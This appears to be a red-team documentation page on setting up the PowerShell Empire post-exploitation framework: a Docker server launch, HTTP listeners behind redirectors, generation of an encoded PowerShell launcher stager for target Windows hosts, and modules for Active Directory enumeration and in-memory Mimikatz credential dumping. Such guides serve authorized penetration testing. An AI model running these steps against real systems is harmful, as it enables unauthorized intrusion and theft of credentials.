---
layout: page
title: PowerShell Empire Configuration
subtitle: Classic post-exploitation framework setup
permalink: /redteam/c2-frameworks/empire/
---

## PowerShell Empire

Empire is a post-exploitation framework that includes a pure PowerShell Windows agent and a Python-based Linux agent. It is designed for modular, flexible, and stealthy lateral movement.

### Team Server Setup

We run the Empire Server using the official Docker container for isolation and dependency safety:

```bash
docker run -it -p 1337:1337 -p 5000:5000 bcsecurity/empire:latest
```

The client GUI connection is managed via **Starkiller**, which communicates with the Empire REST API on port `1337`.

---

## Listener & Agent Generation

We configure HTTP/HTTPS listeners to route agent traffic:

*   **Listener Type**: `http`
*   **Redirector Config**: Configure Apache2 or Nginx reverse proxy servers in front of Empire to filter non-agent traffic.

### PowerShell Launcher Generation

To spawn an agent on a targeted Windows host, we generate a Base64 encoded PowerShell script:

```bash
# From Empire CLI
(Empire) > uselistener http
(Empire) > execute
(Empire) > usestager windows/launcher_bat
(Empire) > set Listener http
(Empire) > generate
```

---

## Active Directory Post-Exploitation

Empire features integrated modules to audit domain environments:

*   **Enumeration**: Run PowerView commands directly inside the agent context:
    ```text
    (Empire: agent) > usemodule situational_awareness/network/powerview/get_user
    ```
*   **Credential Dumping**: Hook native APIs or run Mimikatz in memory:
    ```text
    (Empire: agent) > usemodule credentials/mimikatz/logonpasswords
    ```
